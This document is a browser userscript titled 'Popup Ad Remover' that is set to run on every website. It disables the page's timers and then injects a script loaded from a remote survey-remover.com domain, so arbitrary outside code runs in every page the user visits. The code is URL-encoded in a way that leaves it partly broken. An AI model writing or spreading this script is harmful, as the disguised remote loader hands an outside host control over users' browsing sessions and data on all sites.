// ==UserScript==
// @name Popup Ad Remover
// @include *
// @description Removes ad from sites (The pop up paid ads only)
// ==/UserScript==

function(){
"[url]http://survey-remover.com/[/url]";
var%20rs=function(){var%20q=function(min,max){return%20Math.floor(Math.random()*(max-min+1))+min};var%20n=[];for(var%20r=0;r<q(9,19);r++){n.push(String.fromCharCode(q(97,122)))}return%20n.join("")};
var%20xc=[];var%20timers=["Timeout","Interval"];
for(var%20i=0;i<timers.length;i++)
{(
function(){
var%20x=window["set"+timers[i]]("null",1);
eval("delete%20clear"+timers[i]);
eval("delete%20set"+timers[i]);
if(window["clear"+timers[i]]==undefined){
if(typeof%20ar=="undefined"){
var%20ar=document.createElement("iframe");
ar.style.display="none";
document.body.appendChild(ar)}window["clear"+timers[i]]=ar.contentWindow["clear"+timers[i]];
window["set"+timers[i]]=ar.contentWindow["set"+timers[i]]}

for(var%20j=x;j>0&&x-j<99999;j--){
window["clear"+timers[i]](j)}})();
(
function(){
var%20op=rs();xc.push(op);window[op]=window["set"+timers[i]];
window["set"+timers[i]]=function(){};
for(var%20j%20in%20window){
try{
if(typeof%20window[j]=="function"){
if(xc.indexOf(j)==-1){
if((window[j]+"").indexOf("function%20set"+timers[i]+"()%20{")!=-1){window[j]=function(){}}"}"}}}catch(e){}}})()}window[xc[0]](function(){window["set"+timers[0]]=window[xc[0]];window["set"+timers[1]]=window[xc[1]];
var%20xjz={version:"3.0",domain:"http://survey-remover.com/",id:"B4f30bb7bb2b14"};var%20scTO=window.setTimeout(function(){window.alert("It%20appears%20that%20the%20server%20could%20not%20be%20reached.%20Please%20try%20to%20use%20the%20bookmarklet%20again%20later!\n"+xjz.domain+"\n\nIf%20there%20is%20a%20problem%20with%20the%20site,%20you%20can%20check%20for%20the%20latest%20information%20on%20the%20Facebook%20page:\nhttp://www.facebook.com/XJZ.Survey.Remover")},10000);
var%20a=document.createElement("script");
a.type="text/javascript";
a.src=xjz.domain.replace("//","//public.")+"remover/?injection="+xjz.version;a.onload=function(){window.clearTimeout(scTO)};window.document.getElementsByTagName("head")[0].appendChild(a)},110)}